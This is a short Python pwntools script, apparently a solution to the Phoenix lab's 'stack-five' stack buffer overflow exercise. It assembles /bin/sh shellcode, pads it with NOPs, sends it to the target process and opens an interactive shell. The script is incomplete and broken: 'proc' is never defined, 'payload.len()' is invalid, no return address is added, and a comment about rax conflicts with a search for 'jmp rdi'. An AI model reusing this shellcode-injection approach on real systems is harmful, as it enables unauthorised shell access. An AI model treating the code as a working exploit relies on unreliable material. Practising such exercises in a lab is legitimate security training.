# Buffer overflow shellcode execution

# This exercise aims at filling shellcode into the buffer, then calling
# /bin/sh

# There's 128 chars in space, so it's not a ton of room. we can
# execute a shell though


import pwn

filepath = '/opt/phoenix/amd64/stack-five'

loaded_file = pwn.ELF(filepath)

# Prepare shellcode to execv /bin/sh
# We don't have NX enabled, so I don't care to jump and find SYSTEM(), EXIT(), and a /bin/sh string
shell = pwn.shellcraft.sh()
payload = pwn.asm(shell)
# Prepare padding
while payload.len() != 136:
    payload = payload + pwn.asm(pwn.shellcraft.nop())

# Four our return address, we have our rax pointing to beginning of the buffer,
# so let's search for a jmp rax in the loaded library
loaded_library = loaded_file.libc()

# Executing the program with ldd, we see that stack-five loads the special library in its own deb package

# root@JesusTakeTheKeyboard:/opt/phoenix/amd64# ldd stack-five 
#	linux-vdso.so.1 (0x00007ffff7ffb000)
#	libc.so => /opt/phoenix/x86_64-linux-musl/lib/libc.so (0x00007ffff7b41000)

search_context = pwn.asm('jmp rdi', arch='amd64')


pwn.log.info(proc.recvline().decode('utf-8'))

proc.sendline(payload)

proc.interactive()
exit()
